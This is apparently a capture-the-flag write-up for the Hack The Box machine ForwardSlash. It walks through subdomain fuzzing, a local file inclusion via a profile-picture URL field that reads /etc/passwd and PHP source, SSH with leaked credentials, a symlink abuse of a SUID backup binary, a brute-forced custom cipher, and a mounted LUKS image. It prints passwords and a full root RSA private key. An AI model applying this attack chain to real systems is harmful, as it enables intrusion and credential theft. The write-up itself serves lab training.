---
title: Hackthebox - ForwardSlash
author: Corshine
date: 2020-06-04 22:21:00 +0700
categories: [Hackthebox]
tags: [LFI, Luks, Crypto, Fuzz, Php, Python, Ssrf]
image: /assets/img/Post/ForwardSlash.jpeg
---

>   **All information available on this site are for educational purposes only. Use these at your own discretion, the site owners cannot be held responsible for any damages caused.**


## **<span style='color:#ff5555'>Summary</span>**
***
- Finding the subdomain with wfuzz
- Testing for LFI (Local File Inclusion)
- Php wrapper to extract the forbidden dir `(dev)`
- Login as **Chiv**
- Analyze the SUID binary `backup` and `config.php.bak`
- Getting **pain** credentials
- Login as **pain**
- cat `user.txt`
- Analyze `encryptorinator`
- Getting the key from the script
- **pain** can run some **root** commands as sudo
- **Mount** the images to **~/mnt** after using the key
- Login as **root**
- cat `root.txt`

***

## **<span style='color:#ff5555'>Nmap</span>**
***
```
╭─blackarch-corshine
╰─❯ nmap -sV -sC -T4 -p- -oA nmap.full forwardslash.htb
# Nmap 7.80 scan initiated Thu Apr  9 15:20:58 2020 as: nmap -sV -sC -T4 -p- -oA nmap.full forwardslash.htb
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.25s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
╭─blackarch-corshine
╰─❯
```
By looking at the result, we only have 2 ports open, `22:ssh` & `80:http`.

## **<span style='color:#ff5555'>Port 80</span>**
***

![BoxInfo]({{ "/images/htb/forwardslash/port80.png" | relative_url }})


I tried to run **Gobuster** but came out with no interesting things.


## **<span style='color:#ff5555'>Wfuzz</span>**
***
```
╭─blackarch-corshine
╰─❯ wfuzz  --hh 0  -H 'Host: FUZZ.forwardslash.htb' -u http://10.10.10.183/ --hc 400 -w /usr/share/wordlists/wfuzz/general/common.txt -c


Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's' documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.183/
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                              
===================================================================

000000088:   302        0 L      6 W      33 Ch       "backup"                                                                             

Total time: 31.30054
Processed Requests: 129
Filtered Requests: 642
Requests/sec.: 21.34991
```
I found subdomain `backup`, therefore I added `backup.forwardslash.htb` on `/etc/hosts`

## **<span style='color:#ff5555'>Gobuster backup sub</span>**
***

Tried `Gobuster` again
```
╭─blackarch-corshine
╰─❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k  -x "txt,html,php" -u http://backup.forwardslash.htb/ -o gobuster.output -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,asp,aspx,jpg,txt,html
[+] Follow Redir:   true
[+] Timeout:        10s
===============================================================
2020/04/21 10:27:17 Starting gobuster
===============================================================
/index.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/welcome.php (Status: 200)
/dev (Status: 403)
/api.php (Status: 200)
/environment.php (Status: 200)
/logout.php (Status: 200)
```
The interesting part is `/dev` is the one who has status **403**

Tried to open it on browser.

![]({{ "/images/htb/forwardslash/loginpage.png" | relative_url }})

I tried to sign up and found `Local File Inclusion` on `/profilepicture.php`, we tried to enable the disabled attributes with **inspect element**

Send it to `burp` > `repeater`

```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
Content-Length: 83
Cache-Control: max-age=0
Origin: http://backup.forwardslash.htb
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://backup.forwardslash.htb/profilepicture.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: PHPSESSID=kgnsdf0213ojmasjbdaskn3sdw
Connection: close
```

`Response`

```
HTTP/1.1 200 OK
Date: Tue, 21 Apr 2020 11:07:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 689
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
	<font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
```
Kinda rabbithole at first because the page did not do anything.

## **<span style='color:#ff5555'>LFI (Local File Inclusion)</span>**
***
I tried to send `file:///etc/passwd` in the `url` paramenter and the `request` is
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
Content-Length: 22
Cache-Control: max-age=0
Origin: http://backup.forwardslash.htb
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://backup.forwardslash.htb/profilepicture.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: PHPSESSID=kgnsdf0213ojmasjbdaskn3sdw
Connection: close
```

And the `response` I got is:

```
HTTP/1.1 200 OK
Date: Tue, 21 Apr 2020 11:08:35 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2349
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
	<font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

So LFI is working, I tried to extract the file from `/dev` but got **Permission Denied**

Because everything is based on php files, I tried to use php wrapper.

[PhpWrapper](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

I tried to include the `/var/www/backup.forwardslash.htb/dev/index.php`

`Request`
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
Content-Length: 101
Cache-Control: max-age=0
Origin: http://backup.forwardslash.htb
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://backup.forwardslash.htb/profilepicture.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: PHPSESSID=kgnsdf0213ojmasjbdaskn3sdw
Connection: close
```

and the `response`
```
HTTP/1.1 200 OK
Date: Tue, 21 Apr 2020 11:23:25 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3361
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
	<font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
```

I tried to decode the last `response` with base64.

![]({{ "/images/htb/forwardslash/base64encoded.png" | relative_url }})

and I got `php` code of `/dev/index.php`

```
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
	<h1>XML Api Test</h1>
	<h3>This is our api test for when our new website gets refurbished</h3>
	<form action="/dev/index.php" method="get" id="xmltest">
		<textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
		<input type="submit">
	</form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

	$reg = '/ftp:\/\/[\s\S]*\/\"/';
	//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

	if (preg_match($reg, $_GET['xml'], $match)) {
		$ip = explode('/', $match[0])[2];
		echo $ip;
		error_log("Connecting");

		$conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

		error_log("Logging in");

		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}

		exit;
	}

	libxml_disable_entity_loader (false);
	$xmlfile = $_GET["xml"];
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$api = simplexml_import_dom($dom);
	$req = $api->request;
	echo "-----output-----<br>\r\n";
	echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

But I found the interesting line
```
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {
```
By seeing that line, it shows `ftp-login` meanwhile there is no `FTP` ports being generated from `nmap` scans, so I figured it out to try to `ssh` with the credentials.

```
╭─blackarch-corshine
╰─❯ sshpass -p N0bodyL1kesBack/ ssh chiv@10.10.10.183
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 21 11:30:42 UTC 2020

  System load:  0.0                Processes:            164
  Usage of /:   30.6% of 19.56GB   Users logged in:      0
  Memory usage: 12%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr 21 07:35:26 2020 from 10.10.14.52
chiv@forwardslash:~$ 
```

We logged in as user `chiv`, but we don't have permission to read the `user.txt` because it's owned by other user which is `pain`
```
-rw------- 1 pain pain   33 Apr 21 06:08 user.txt
```

## **<span style='color:#ff5555'>Escalating to user (pain)</span>**
***
I tried to run `LinPeas.sh` to find a way to get user `pain`, and I found that `pain` owned `SUID` binary

```
[-] SUID files:
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
```

Also I found `config.php.bak` which also owned by `pain`, but `chiv` does not have to do anything with it, so move on :')

## **<span style='color:#ff5555'>Analyze the binary</span>**
***
By exploring around with the binary, I found that the hash generating hash `md5`

```
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same secon
```

I was thinking about `crontab` but I did not find any cron vulns when I ran `LinPeas.sh`.

I made a `bash` script to identify the md5 value, will it be the same or no everything it's being generated.

```
time="$(date +%H:%M:%S | tr -d '\n' | md5sum | tr -d ' -')" && backup
```

Output

```
chiv@forwardslash:~$ ./corshinebin.sh 
834e8e2a2c83f1b3e2dbfe3929e24b34
----------------------------------------------------------------------
	Pains Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

ERROR: 834e8e2a2c83f1b3e2dbfe3929e24b34 Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ 
```

So I found the md5 is being generated, and it has something to do with `config.php.bak`

## **<span style='color:#ff5555'>Script to get to pain</span>**
***
```
#!/bin/bash

time="$(date +%H:%M:%S | tr -d '\n' | md5sum | tr -d ' -')" && echo "work"
ln -s /var/backups/config.php.bak /home/chiv/$time
backup
```

Tried to run it with expectation it will show the timestamp but instead it reveals the best `loot!`

```
chiv@forwardslash:~$ ./corshinebin.sh 
47771ddc7eb2d50853a6bf5c4ab81c69
----------------------------------------------------------------------
	Pains Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 01:02:21
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

We got user `pain` credentials for `mysql` database

I tried to switch to user `pain`

```
chiv@forwardslash:~$ su - pain
Password: 
pain@forwardslash:~$
```

```
pain@forwardslash:~$ cat user.txt
dc------------------------------
pain@forwardslash:~$ 
```

## **<span style='color:#ff5555'>Escalating to root</span>**
***
By running `sudo -l`, user `pain` can run these following commands with `sudo` priveleges.

```
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Googling around about `cryptsetup` [here](https://linux.die.net/man/8/cryptsetup)

There is a python script called `encrypter.py` and and ciphertext in the dir called **encryptorinator.**

```
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

By reading the code, I tried to decrypt the ciphertext with `python` script

```
def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)

ciphertext = open('ciphertext', 'r').read().rstrip()
for i in range(1, 20): 
    for j in range(33, 127): 
        key = chr(j) * i
        msg = decrypt(key, ciphertext)
        if 'the ' in msg  or 'and ' in msg or 'of ' in msg :
            exit("final msg is " + msg)
```

```
╭─blackarch-corshine
╰─❯ python2 decryptcipher.py
Key: ttttttttttttttttt, Msg: Hl��vF��;�������&you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
```

Found **ttttttttttttttttt**, `cB!6%sdH8Lj^@Y*$C2cf`, and there is interesting image at `/var/backups/recovery`

Now we try to connect with the image called `cryptsetup` and we able to run it with `root.`

```
pain@forwardslash:/var/backups/recovery$ ls -la
total 976576
drwxrwx--- 2 root backupoperator       4096 May 27  2019 .
drwxr-xr-x 3 root root                 4096 Mar 24 10:10 ..
-rw-r----- 1 root backupoperator 1000000000 Apr 21 16:01 encrypted_backup.img
```

Tried to map `encrypted_backup.img` with `cryptsetup` in `/dev/mapper/backup`

```
pain@forwardslash:~$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:~$
```

I tried to create dir mnt and execute `sudo /bin/mount /dev/mapper/backup /mnt/`, and now it's mounted to `mnt dir`

I found **id_rsa** of `root`


```
pain@forwardslash:~/mnt$ ls -la
total 8
drwxr-xr-x 2 root root   20 Mar 17 20:07 .
drwxr-xr-x 8 pain pain 4096 Apr 21 16:34 ..
-rw-r--r-- 1 root root 1675 May 27  2019 id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

```
